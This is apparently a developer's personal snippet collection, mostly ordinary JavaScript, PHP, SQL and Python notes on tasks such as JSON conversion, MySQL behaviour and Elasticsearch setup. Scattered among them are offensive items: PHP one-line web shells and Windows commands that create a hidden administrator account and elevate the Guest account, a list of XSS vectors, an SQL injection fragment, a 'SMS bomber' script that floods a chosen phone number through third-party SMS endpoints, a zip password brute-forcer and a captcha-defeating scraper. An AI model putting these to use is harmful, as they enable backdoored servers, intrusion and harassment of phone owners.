###[socket.io-php](https://github.com/rase-/socket.io-php-emitter)
```js
$redis = new \Redis(); // Using the Redis extension provided client
$redis->connect('127.0.0.1', '6379');
$emitter = new SocketIO\Emitter($redis);
$emitter->emit('event', 'payload str');
$emitter = new SocketIO\Emitter(array('port' => '6379', 'host' => '127.0.0.1'));
// broadcast can be replaced by any of the other flags
$emitter->broadcast->emit('other event', 'such data');
```
###[xss data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K](http://www.csdn.net/article/2013-02-01/2814041-1-line-browser-notepad)
```js
    data:text/html, <html contenteditable>  
data:text/html, <textarea style="font-size: 1.5em; width: 100%; height: 100%; border: none; outline: none" autofocus /> 
data:text/html,<html lang="en"><head><style> html,body { height: 100% } #note { width: 100%; height: 100% } </style> <script> var note, html, timeout; window.addEventListener('load', function() { note = document.getElementById('note'); html = document.getElementsByTagName('html')[0]; html.addEventListener('keyup', function(ev) { if (timeout) clearTimeout(timeout); timeout = setTimeout(saveNote, 100); }); restoreNote(); note.focus(); }); function saveNote() { localStorage.note = note.innerText; timeout = null; } function restoreNote() { note.innerText = localStorage.note || ''; } </script> </head><body><h1>Notepad (type below, notes persist)</h1> <p id="note" contenteditable=""></p> </body></html>

data:text/html, <style type="text/css">#e{position:absolute;top:0;right:0;bottom:0;left:0;}</style><div id="e"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script>var e=ace.edit("e");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/ruby");</script> 

https://gist.github.com/minikomi/4672169

data:text/html, <body><canvas id="dyDraw">你的浏览器不支持HTML5 Canvas</canvas></body><script>function $(id){return document.getElementById(id);} $('dyDraw').width=document.body.clientWidth;$('dyDraw').height=document.body.clientHeight;if(window.addEventListener){window.addEventListener('load',function(){var canvas,canvastext;var hua=false;function dyDrawing(){canvas=$('dyDraw');canvastext=canvas.getContext('2d');canvas.addEventListener('mousedown',canvasMouse,false);canvas.addEventListener('mousemove',canvasMouse,false);window.addEventListener('mouseup',canvasMouse,false);} function canvasMouse(dy){var x,y;if(dy.layerX||dy.layerX==0){x=dy.layerX;y=dy.layerY;}else if(dy.offsetX||dy.offsetX==0){x=dy.offsetX;y=dy.offsetY;} x-=dyDraw.offsetLeft;y-=dyDraw.offsetTop;if(dy.type=='mousedown'){hua=false;canvastext.beginPath();canvastext.moveTo(x,y);hua=true;}else if(dy.type=='mousemove'){if(hua){canvastext.strokeStyle="rgb(255,0,0)";canvastext.lineWidth=9;canvastext.lineTo(x,y);canvastext.stroke();}}else if(dy.type=='mouseup'){hua=false;}} dyDrawing();},false);}</script>

支持各种编程语言的编辑器http://www.cnblogs.com/voidy/p/4276156.html

浏览器地址栏输入以下内容：

data:text/html, <style type="text/css">.e{position:absolute;top:0;right:0;bottom:0;left:0;}</style><div class="e" id="editor"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script>var e=ace.edit("editor");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/ruby");</script>

更多语言的支持: 将 ace/mode/ruby用以下语言替换：

Markdown -> ace/mode/markdown

Python -> ace/mode/python

C/C++ -> ace/mode/c_cpp

Javscript -> ace/mode/javascript

Java -> ace/mode/java

Scala- -> ace/mode/scala

CoffeeScript -> ace/mode/coffee

and css, html, php, latex, tex, sh, sql, lua, clojure, dart, typescript, go, groovy, json, jsp, less, lisp, lucene, perl, powershell, scss, textile, xml, yaml, xquery, liquid, diff and many more...
想换个主题

将 ace/theme/monokai用下面的替换掉：

Eclipse -> ace/theme/eclipse

GitHub -> ace/theme/github

TextMate -> ace/theme/textmate

and ambiance, dawn, chaos, chrome, dreamweaver, xcode, vibrant_ink, solarized_dark, solarized_light, tomorrow, tomorrow_night, tomorrow_night_blue, twilight, tomorrow_night_eighties, pastel_on_dark and many more..

##想在浏览器编辑Markdown

data:text/html,<style type="text/css">.e{position:absolute;top:0;right:50%;bottom:0;left:0;} .c{position:absolute;overflow:auto;top:0;right:0;bottom:0;left:50%;}</style><div class="e" id="editor"></div><div class="c"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script src="http://cdnjs.cloudflare.com/ajax/libs/showdown/0.3.1/showdown.min.js"></script><script> function showResult(e){consoleEl.innerHTML=e}var e=ace.edit("editor");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/markdown");var consoleEl=document.getElementsByClassName("c")[0];var converter=new Showdown.converter;e.commands.addCommand({name:"markdown",bindKey:{win:"Ctrl-M",mac:"Command-M"},exec:function(t){var n=e.getSession().getMode().$id;if(n=="ace/mode/markdown"){showResult(converter.makeHtml(t.getValue()))}},readOnly:true})</script>
```
###[XSS vectors](https://gist.github.com/JohannesHoppe/5612274)
```js

<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
```
###[javascript 实现html页面的关键字搜索](https://segmentfault.com/q/1010000008155078)
```js
document.getElementsByClassName('markdown-body')[0].innerHTML=html.replace(searchKey, '<span class=\'highlight\'>' + searchKey + '</span>')
<div data-v-4fced2a0="" class="markdown-body">
  <section data-v-4fced2a0=""><h1 id="Hello">Hello</h1>
    <h2>hello1</h2>
    <h2>hello2</h2>
    <p><code>&lt;span&gt;<span>{{</span>sss<span>}}</span>&lt;/span&gt;</code></p>
    <blockquote><p>This is test.</p></blockquote>
    <ul>
      <li>How are you?</li>
      <li>Fine, Thank you, and you?</li>
      <li>I'm fine， too. Thank you.</li>
      <li>
        🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃
      </li>
    </ul>
    <h1 id="最新消息">最新消息</h1>
  </section>
</div>
 (function () {

    var searchKey = 'F'
    var html = document.getElementsByClassName('markdown-body')[0].innerHTML
   document.getElementsByClassName('markdown-body')[0].innerHTML=html.replace(searchKey, '<span class=\'highlight\'>' + searchKey + '</span>')

  }())
```
###[json转换](https://segmentfault.com/q/1010000008155612)
```js
let arr = [{
    "id": "1",
    "parentId": "0",
    "nodeName": "公告资讯",
}, {
    "id": "2",
    "parentId": "1",
    "nodeName": "查看公告",
}, {
    "id": "4",
    "parentId": "0",
    "nodeName": "公告资讯",
}, {
    "id": "5",
    "parentId": "4",
    "nodeName": "查看公告",
}, {
    "id": "6",
    "parentId": "4",
    "nodeName": "查看公告1",
}];
let result = arr.reduce(function(prev, item) {
    prev[item.parentId] ? prev[item.parentId].push(item) : prev[item.parentId] = [item];
    return prev;
}, {});
for (let prop in result) {
    result[prop].forEach(function(item, i) {
        result[item.id] ? item.children = result[item.id] : ''
    });
}
result = result[0];
console.log(JSON.stringify(result))
[{"id":"1","parentId":"0","nodeName":"公告资讯","children":[{"id":"2","parentId":"1","nodeName":"查看公告"}]},{"id":"4","parentId":"0","nodeName":"公告资讯","children":[{"id":"5","parentId":"4","nodeName":"查看公告"},{"id":"6","parentId":"4","nodeName":"查看公告1"}]}]
```
###[js 获取当天凌晨的时间戳](https://segmentfault.com/q/1010000008160697)
```js
var timeStamp = new Date(new Date().setHours(0, 0, 0, 0)) / 1000;
//一天是86400秒   故n天前的时间戳为
var ThreeDayAgo = timeStamp - 86400 * n;
console.log(ThreeDayAgo)
```
###[xmlToString](https://segmentfault.com/q/1010000008161339)
```js
function xmlToString(xmlData) { 

    var xmlString;
    //IE
    if (window.ActiveXObject){
        xmlString = xmlData.xml;
    }
    // code for Mozilla, Firefox, Opera, etc.
    else{
        xmlString = (new XMLSerializer()).serializeToString(xmlData);
    }
    return xmlString;
}
```
###[Sublime Text 奇技淫巧](https://wowphp.com/post/qzpnewo2gxj8.html)
```js
用标签包裹行或选中项 Win：ALT + SHIFT + W     Mac：CTRL + ⇧ + W
计算数学表达式 Win：CTRL + SHIFT + Y     Mac：⌘ + ⇧ + Y
上移或下移行 Win：CTRL + SHIFT + ↑ 或 ↓     Mac：⌘ + CTRL + ⇧ 或 ⇩
```
###[Windows下搭建开发环境](https://wowphp.com/post/x69ndryep302.html)
```js
// 连接你的本地MySQL数据库 记得把 _CLh*#0Vlnwt 改为你自己的密码
$mysqli = new mysqli('127.0.0.1', 'root', '_CLh*#0Vlnwt');
// 连接失败
if ($mysqli->connect_error) {
    die('Connect Error (' . $mysqli->connect_errno . ') '
            . $mysqli->connect_error);
}
// 连接成功https://wowphp.com/catalog.html
echo 'Connection OK';
// 关闭MySQL连接
$mysqli->close();
```
###[PHP 数组去重](https://wowphp.com/post/o1xkd7l6dvj3.html)
```js
$array = array('green','blue','orange','blue');
$array = array_flip($array);
$array = array_flip($array);
 
/* 使用array_merge()函数修复键值*/
$array = array_merge($array);
$array = array('green','blue','orange','blue');
$array = array_flip($array);
/* 跟第一个例子一样，但是现在我们先提取数组的键值 */
$array = array_keys($array);
```
###["replace into" 的坑](https://wowphp.com/post/k08pekpxd9q7.html)
```js
mysql> SHOW CREATE TABLE auto\G
*************************** 1. row ***************************
       Table: auto
Create Table: CREATE TABLE `auto` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `k` int(10) unsigned NOT NULL,
  `v` varchar(100) DEFAULT NULL,
  `extra` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_k` (`k`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1
1 row in set (0.01 sec)
INSERT INTO auto (k, v, extra) VALUES (1, '1', 'extra 1'), (2, '2', 'extra 2'), (3, '3', 'extra 3');
xupeng@diggle7:3600(dba_m) [dba] mysql> SELECT * FROM auto;
+----+---+------+---------+
| id | k | v    | extra   |
+----+---+------+---------+
|  1 | 1 | 1    | extra 1 |
|  2 | 2 | 2    | extra 2 |
|  3 | 3 | 3    | extra 3 |
+----+---+------+---------+
REPLACE INTO auto (k, v) VALUES (1, '1-1');
在执行 REPLACE INTO auto (k) VALUES (1) 时首先尝试 INSERT INTO auto (k) VALUES (1)，但由于已经存在一条 k=1 的记录，发生了 duplicate key error，于是 MySQL 会先删除已有的那条 k=1 即 id=1 的记录，然后重新写入一条新的记录。
满足这一需求的 MySQL 方言是:

INSERT INTO auto (k, v) VALUES (1, ‘1-1’) ON DUPLICATE KEY UPDATE v=VALUES(v);

鉴于此，很多使用 REPLACE INTO 的场景，实际上需要的是 INSERT INTO … ON DUPLICATE KEY UPDATE，在正确理解 REPLACE INTO 行为和副作用的前提下，谨慎使用 REPLACE INTO
```
###[Hack神器及奇技淫巧](http://blog.yfgeek.com/2016/09/11/hacktool/)
```js
http://www.findmima.com/

http://www.wghostk.com/so/

http://p.08lt.com
http://whois.domaintools.com/
http://www.144118.com/
Windows新建用户

net user admin$ admin /add

net localgroup administrators admin$ /add

net user Guest 1234

net user Guest /active:yes

net localgroup administrators Guest /add
<?php eval($_POST[g]);?>
<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>

```
###[php农历 ](http://blog.leanote.com/post/sinux/8ca27e3f616c)
```js


```
###[循环加速](http://www.phppan.com/2011/01/craft-1-cycle/)
```js
$data = range(0, 1000000);
 
$start = xdebug_time_index();
 
$len = count($data);	//	其实局部变量是很快的。
for($i = 0; $i < $len; $i++) {
}
$end = xdebug_time_index();
 
echo $end - $start;
$data = range(0, 1000000);
 将计数变量从大到小递减，当为0时自动停止。从而将判断语句和计数加1两条语句变成了一条语句。
$start = xdebug_time_index();
 
for($i = count($data); $i--;) {	//	我是关注点所在行
}
$end = xdebug_time_index();
 
echo $end - $start;
```
###[ghost.py模拟登陆Facebook](http://stackoverflow.com/questions/32959173/login-to-facebook-using-the-ghost-py-python-package)
```js
from ghost import Ghost, Session

ghost = Ghost()
USERAGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"

with ghost.start():
    session = Session(ghost, download_images=False, display=True, user_agent=USERAGENT)
    page, rs = session.open("https://m.facebook.com/login.php", timeout=120)
    assert page.http_status == 200

    session.evaluate("""
    document.querySelector('input[name="email"]').value = 'email@email.com';
    document.querySelector('input[name="pass"]').value = 'email-password';
    """)

    session.evaluate("""document.querySelector('input[name="login"]').click();""",
                 expect_loading=True)

    """
    import codecs

    with codecs.open('fb.html', encoding='utf-8', mode='w') as f:
       f.write(session.content)
    """

    # session.save_cookies('fbookie')
    session.capture_to(path='fbookie.png')

    # gracefully clean off to avoid errors
    session.webview.setHtml('')
    session.exit()
with ghost.start() as session:
    page, extra_resources = session.open("http://jeanphix.me")
    assert page.http_status == 200 and 'jeanphix' in page.content    
    page, resources = ghost.evaluate("agree()", expect_loading=True)
```
###[去除重复的json](https://segmentfault.com/q/1010000008164996)
```js
var arr = [];
var list = [{"name":"123"},{"name":"123"},{"name":"456"}];
for(var i = 0; i < list.length; i++){
if(i == 0) arr.push(list[i]);
if(arr.length > 0 && i > 0){
    for(var j = 0; j < arr.length; j++){
        if(arr[j].name != list[i].name){
            arr.push(list[i]);
        break;
        }
    }
}
}
for(var x = 0; x <arr.length; x++)
{alert(arr[x].name);}
```
###[树形结构的迭代器展开为一维结构](http://www.cnblogs.com/xingmeng/p/3583204.html)
```js
$fruits = array("a" => "lemon", "b" => "orange", array("a" => "apple", "p" => "pear"));
$arrayiter = new RecursiveArrayIterator($fruits);
$iteriter = new RecursiveIteratorIterator($arrayiter);
foreach ($iteriter as $key => $value) {
    $d = $iteriter->getDepth();
    echo "depth=$d k=$key v=$value\n";
}
print_r($iteriter->getArrayCopy());
/**output
depth=0 k=a v=lemon
depth=0 k=b v=orange
depth=1 k=a v=apple
depth=1 k=p v=pear
 **/
 SimpleXML转换为数组
 $xml = <<<XML
<books>
    <book>
        <title>PHP Basics</title>
        <author>Jim Smith</author>
    </book>
    <book>XML basics</book>
</books>
XML;
// SimpleXML转换为数组 http://www.ruanyifeng.com/blog/2008/07/php_spl_notes.html
function sxiToArray($sxi)
{
    $a = array();
    for ($sxi->rewind(); $sxi->valid(); $sxi->next()) {
        if (!array_key_exists($sxi->key(), $a)) {
            $a[$sxi->key()] = array();
        }
        if ($sxi->hasChildren()) {
            $a[$sxi->key()][] = sxiToArray($sxi->current());
        } else {
            $a[$sxi->key()][] = strval($sxi->current());
        }
    }
    return $a;
}

$xmlIterator = new SimpleXMLIterator($xml);
$rs = sxiToArray($xmlIterator);
print_r($rs);
/**output
Array
(
    [book] => Array
        (
            [0] => Array
                (
                    [title] => Array
                        (
                            [0] => PHP Basics
                        )

                    [author] => Array
                        (
                            [0] => Jim Smith
                        )

                )

            [1] => XML basics
        )

)
 **/
 //找出../目录中.php扩展名的文件
$iterator = new GlobIterator('./*.php');
if (!$iterator->count()) {
    echo '无php文件';
} else {
    $n = 0;
    printf("总计 %d 个php文件\r\n", $iterator->count());
    foreach ($iterator as $item) {
        printf("[%d] %s\r\n", ++$n, $iterator->key());
    }
}
$it = new DirectoryIterator("../");
foreach ($it as $file) {
    //用isDot ()方法分别过滤掉“.”和“..”目录
    if (!$it->isDot()) {
        echo $file . "\n";
    }
}
//列出指定目录中所有文件
 $path = realpath('../');
 $objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::SELF_FIRST);
 foreach ($objects as $name => $object) {
     echo "$name\n";
 }

$it = new FilesystemIterator('../');
 foreach ($it as $fileinfo) {
     echo $fileinfo->getFilename() . "\n";
 }
 ```
###[querySelector返回的是一个元素数组，不能直接绑定事件](https://segmentfault.com/q/1010000007811043 )
```js
tooldetails = documnet.getElementByClassName('name');
for(var i = 0; i < tooldetails.length; i++){
    tooldetails[i].addEventlistener("click",tooldetailsFunc);
} 
```
###[js里面采用window.open(url,"_blank")跳转方式，被浏览器拦截](https://segmentfault.com/q/1010000008090476)
`点击两次，在添加一个按钮，第二次的时候在调用window.open()`
###[MySQL行转列](http://stackoverflow.com/questions/1241178/mysql-rows-to-columns)
```js
SELECT 
    hostid, 
    sum( if( itemname = 'A', itemvalue, 0 ) ) AS A,  
    sum( if( itemname = 'B', itemvalue, 0 ) ) AS B, 
    sum( if( itemname = 'C', itemvalue, 0 ) ) AS C 
FROM 
    bob 
GROUP BY 
    hostid;
```
###ajax from serialize
```js
$.ajax({
   type: "POST",
   url:"ajax.php",
   data:$('#formID').serialize(),// 要提交的表单
   success: function(msg) {alert(msg);},
   error: function(error){alert(error);}
});

```
###Html转义
```js
//获取Html转义字符  
function htmlEncode( html ) {  
  return document.createElement( 'a' ).appendChild(   
         document.createTextNode( html ) ).parentNode.innerHTML;  
};  
//获取Html   
function htmlDecode( html ) {  
  var a = document.createElement( 'a' ); a.innerHTML = html;  
  return a.textContent;  
}; htmlEncode('>')
```
###获取网页url
`$x('//a').map(function(i){return i.href;}) `
###laravel 获取上传文件内容
```js
$file = Request::file('suggest_batch');

        $file = file_get_contents($file->getRealPath());

```
###包含HTML标签
```js
function contains_html($str)
    {
        return $str != strip_tags($str);
    }
```
###主库查询
```js
    
    $this->setConnection('webinar');链接指定数据库// 强制走主库
					$webinarDailyObj = new WebinarDailyFlow();
                    $webinarDailyObj->setConnection('master_write');
$model = new self();
        $count = $model->setConnection('master_write')->where('webinar_id', $webinarId)->count();
$count=\DB::connection('master_write')->table('users')->find(20);

```
###sql拼接
```js
foreach( $multipleData as $data ) {
                $whereIn .= "'".$data[$referenceColumn]."', ";
            }
            $q = rtrim($q, ", ")." WHERE ".$referenceColumn." IN (".  rtrim($whereIn, ', ').")";
 
            return DB::update(DB::raw($q));
```
###[php识别二维码](http://git.oschina.net/capitalist/php-qr-decoder)
```js
include_once('./lib/QrReader.php');
$qrcode = new QrReader('path/to_image');  //图片路径
$text = $qrcode->text(); //返回识别后的文本
```
###[php脚本自动识别验证码]()
```js
require 'TesseractOCR.php';

function weizhang($car_code, $fdjh)
{

    $shanghui = mb_substr($car_code, 0, 1, 'utf-8');

    $pre = array(
        '冀' => 'he',
        '云' => 'yn'
    );

    $url_pre = $pre[$shanghui];

    $headers = array(
        'Host: '.$url_pre.'.122.gov.cn',
        'Origin: http://'.$url_pre.'.122.gov.cn',
        'Referer: http://'.$url_pre.'.122.gov.cn/views/inquiry.html?q=j',
        'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36 QQBrowser/4.1.4132.400'
    );

    //初始化变量
    $cookie_file = 'cookie.txt';
    $login_url = "http://$url_pre.122.gov.cn/views/inquiry.html?q=j";
    $post_url = "http://$url_pre.122.gov.cn/m/publicquery/vio";
    $verify_code_url = "http://$url_pre.122.gov.cn/captcha?nocache=".time();

    $curl = curl_init();
    $timeout = 5;
    curl_setopt($curl, CURLOPT_URL, $login_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_file); //获取COOKIE并存储
    $contents = curl_exec($curl);
    curl_close($curl);


    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $verify_code_url);
    curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $img = curl_exec($curl);
    curl_close($curl);

    $fp = fopen("verifyCode.jpg", "w");
    fwrite($fp, $img);
    fclose($fp);

    $code = (new TesseractOCR('verifyCode.jpg'))->psm(7)->run();

	$code = explode("\n", $code);

	$code = $code[1];
    echo $code.PHP_EOL;
    if (strlen($code) != 4) {
        return json_encode(array('code'=>500));
    }

    $data = array(
        'hpzl'=>'02',
        'hphm1b' => substr($car_code, -6),
        'hphm' => $car_code,
        'fdjh' => $fdjh,
        'captcha' => $code,
        'qm' => 'wf',
        'page' => 1
    );

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $post_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie_file);
    $result = curl_exec($curl);
    curl_close($curl);

    //unlink($cookie_file);
    //unlink('verifyCode.jpg');

    return $result;
}

$count = 0;


// 车牌号
$car_code = '冀Dxxxxx';
// 发动机后6位
$fdjh = 'xxxxxx';

while (true) {

    $count++;

    if ($count>50) {
        exit('查询失败');
    }

    $res = weizhang($car_code, $fdjh);

    $info = json_decode($res, true);

    echo $res.PHP_EOL;

    if ($info['code'] == 200) {
        echo '车牌号: '. $car_code.PHP_EOL;
        echo '未处理违章数: '.$info['data']['content']['zs'];
        exit();
    }
}
```
###[sql注入技巧](http://www.slideshare.net/p8361/sql-14437201)
```js
SelectNAME_CONST(a,1),NAME_CONST(b,2) a b 1 2 
```
###[下载并安装 安装 Elasticsearch + Kibana + Marvel](https://pigjian.com/article/elasticsearch-kibana-marvel)
```js
sudo apt-get install default-jre
sudo apt-get install default-jdk
sudo add-apt-repository ppa:webupd8team/java
sudo apt-get update
sudo apt-get install oracle-java8-installer
sudo apt-get install oracle-java8-set-default
curl -L -O https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.4/elasticsearch-2.3.4.tar.gz
tar -xvf elasticsearch-2.3.4.tar.gz
cd elasticsearch-2.3.4 #进入你解压的文件夹
./bin/elasticsearch
curl 'localhost:9200'
curl -L -O https://download.elastic.co/kibana/kibana/kibana-4.5.3-linux-x64.tar.gz
tar -zxvf kibana-4.5.3-linux-x64.tar.gz
cd elasticsearch-2.3.4
sudo ./bin/plugin install license
sudo ./bin/plugin install marvel-agent
cd kibana-4.5.3
sudo ./bin/kibana plugin --install elasticsearch/marvel/latest
./bin/kibana
```
###[python将文字转换成图片 ](http://blog.csdn.net/iloster/article/details/25431007)
```js
    import os  
    import pygame  
    from pygame.locals import *  
      
    pygame.init()  
       
    text = u"这是一段测试文本，test 123。"  
    font = pygame.font.SysFont('SimHei', 14)  
    ftext = font.render(text, True, (0, 0, 0), (255, 255, 255))  
       
    pygame.image.save(ftext, "t.jpg")  
```
###第三周的第四天
```js
$date = new DateTime();
//传入2017，3，4表示2017年第三周第4天得到2017-1-19的时间对象
$date->setISODate(2017, 3, 4);// 第三周的第四天
echo $date->format('Y-m-d') 
```
###[python版的短信轰炸机](http://blog.csdn.net/iloster/article/details/27795017)
```js
    import httplib,urllib,sys,os,re,urllib2  
    import string  
        #https://github.com/iloster/PythonScripts/blob/master/opera.py
    def attack(phone):  
        datas=""   
        url='http://www.oupeng.com/sms/sendsms.php?os=s60&mobile=%s' % phone  
        i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",    
                      "Accept": "text/plain",'Referer':'http://www.oupeng.com/download'}   
        #payload=urllib.urlencode(payload)  
         
        try:  
            request=urllib2.Request(url=url,headers=i_headers)  
            response=urllib2.urlopen(request)  
            datas=response.read()  
            print datas  
            print 'attack success!!!'  
        except Exception, e:  
            print e  
            print "attack failed!!!"   
       
    if __name__=="__main__":  
        phone=raw_input('input the phone:')  
        attack(phone) 
import httplib,urllib,sys,os,re,urllib2  
import string  
  
def attack(phone):  
    datas=""  
      
    url='http://topic.hongxiu.com/wap/action.aspx'  
    #请求的数据  
    payload={'hidtpye':'1',  
        'txtMobile':phone}  
    #注意Referer不能为空  
    i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",    
                  "Accept": "text/plain",'Referer':'http://topic.hongxiu.com/wap/'}   
    payload=urllib.urlencode(payload)  
     
    try:  
        request=urllib2.Request(url,payload,i_headers)  
        response=urllib2.urlopen(request)  
        datas=response.read()  
        print datas  
        print 'attack success!!!'  
    except Exception, e:  
        print e  
        print "attack failed!!!"   
   
if __name__=="__main__":  
    phone=raw_input('input the phone:')  
    attack(phone)  	
	
	
```
###[暴力破解含密码的zip压缩文件 ](http://blog.csdn.net/iloster/article/details/23523807)
```js
    import zipfile  
    import os  
    from threading import Thread  
    import time  
    #压缩文件的路径 https://github.com/iloster/PythonScripts 
    path = r'C:\Users\Administrator\Desktop\moeMaid-master.zip'  
    #password='1234'  
      
    def pojie_zip(path,password):  
        if path[-4:]=='.zip':  
            #path = dir+ '\\' +file  
            #print path  
            zip = zipfile.ZipFile(path, "r",zipfile.zlib.DEFLATED)  
            #print zip.namelist()  
            try:  
                #若解压成功，则返回True,和密码  
                zip.extractall(path='C:\\Users\\Administrator\\Desktop\\',members=zip.namelist() , pwd=password)  
                print ' ----success!,The password is %s' % password  
                zip.close()  
                return True  
            except:  
                pass  #如果发生异常，不报错  
            print 'error'  
              
              
    def get_pass():  
        #密码字典的路径  
        passPath='C:\\Users\\Administrator\\Desktop\\zip.txt'  
        passFile=open(passPath,'r')  
        for line in passFile.readlines():  
            password=line.strip('\n')  
            print 'Try the password %s' % password  
            if pojie_zip(path,password):  
                break  
        passFile.close()  
    if __name__=='__main__':  
        start=time.clock()  
        get_pass()  
        print "done (%.2f seconds)" % (time.clock() - start)  
```
###[模拟登陆58](https://segmentfault.com/q/1010000008172084)
```js
# -*- coding: utf-8 -*-
from selenium import webdriver
import time

driver = webdriver.Chrome()
driver.get("https://passport.58.com/login")

time.sleep(2)
driver.maximize_window() 

driver.find_element_by_xpath('//*[@id="pwdLogin"]/i').click()
driver.find_element_by_xpath('//*[@id="usernameUser"]').send_keys("your username")
# 执行一段JS让密码框显示出来，页面上看到的哪个模拟点击不行
driver.execute_script("document.getElementById('passwordUser').setAttribute('style', 'display: block;')")
time.sleep(2)
driver.find_element_by_xpath('//*[@id="passwordUser"]').send_keys("your password")
#点击登陆按钮
driver.find_element_by_xpath('//*[@id="btnSubmitUser"]').click()
# driver.close()

from selenium.webdriver.common.keys import Keys
from selenium import webdriver
driver = webdriver.Firefox()
driver.get('https://passport.58.com/')
driver.find_element_by_xpath("//div[@class='pwdlogin']").click()#先点击密码登录才会有usernameUser这个id元素
driver.find_element_by_xpath("//input[@id='usernameUser']").click()#ok
```
###[MySQL数字类型int与tinyint、float与decimal如何选择](http://seanlook.com/2016/04/29/mysql-numeric-int-float/)
```js
int型数据无论是int(4)还是int(11)，都已经占用了 4 bytes 存储空间，M表示的只是显示宽度(display width, max value 255)，并不是定义int的长度。
DECIMAL(M,D)。M是数字最大位数（精度precision），范围1-65；D是小数点右侧数字个数（标度scale），范围0-30，但不得超过M。
DECIMAL(18,9)，整数部分和小数部分各9位，所以各占4字节，共8bytes
DECIMAL(7,3)：

能存的数值范围是 -9999.999 ~ 9999.999，占用4个字节
123.12 -> 123.120，因为小数点后未满3位，补0
123.1245 -> 123.125，小数点只留3位，多余的自动四舍五入截断
12345.12 -> 保存失败，因为小数点未满3位，补0变成12345.120，超过了7位。严格模式下报错，非严格模式存成9999.999
float与float(10)是没区别的，float默认能精确到6位有效数字
坚决不允许使用float去存money，使用decimal更加稳妥
decimal(8,2)数值范围是 -999999.99 ~ 999999.99
1000000超过了6位,严格模式下报错，非严格模式存成999999.99 https://segmentfault.com/q/1010000008170644/a-1020000008171065
```
###[decimal(14,2)改成decimal(22,10)](https://segmentfault.com/q/1010000008165935)
```js
$sql = "SELECT CONCAT( 'alter table ', table_name, ' MODIFY COLUMN ', column_name, ' decimal(22,10) DEFAULT NULL;' ) AS execSql, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.columns a WHERE TABLE_SCHEMA = '".YourDBName."' AND data_type IN ('decimal')";
// 返回的结果里已经将要执行的更改sql拼接好了，接下来遍历执行就行了
$return = $this->dbh->query($sql)->fetchAll();
foreach($return as $sql)
{
    try
    {
        $this->dbh->query($sql->execSql);
    }
    catch (PDOException $e)
    {
        echo 'error: '. $e->getMessage() ."exec sql : ".$sql->execSql.PHP_EOL.PHP_EOL;
    }
}


```
###[ORDER BY在子查询里面忽略了](https://mariadb.com/kb/en/mariadb/why-is-order-by-in-a-from-subquery-ignored/)
```js
 获取每个分组下的最新一条
那只要在插入的时候将之前的都设置为old    新的状态为new mysql好像返回的时间最靠前的记录，mariadb返回id最靠前的记录
select * from (select * from a order by id desc) group by some mysql不支持同时group by 和order by
select * from A where created_at = (select max(created_at) from A as t where t.id = A.id) group by A.id
这文章说了，ORDER BY在子查询里面忽略了。。。。 后来改用max子查询的方法，就好了。

```
###[Tesseract识别中文图片](http://qianjiye.de/2015/08/tesseract-ocr)
```js
下载文件https://github.com/tesseract-ocr/tesseract/wiki 对应语言文件https://github.com/tesseract-ocr/tessdata
https://github.com/tesseract-ocr/tesseract/wiki/Data-Files 
tesseract -l chi_sim myscan.png out #使用中文
tesseract images/9531.jpeg stdout -l eng -psm 7 digits

    images/9531.jpeg：输入待OCR的图片；
    stdout：输出结果到终端，也可用文件名，表示输出到文件；
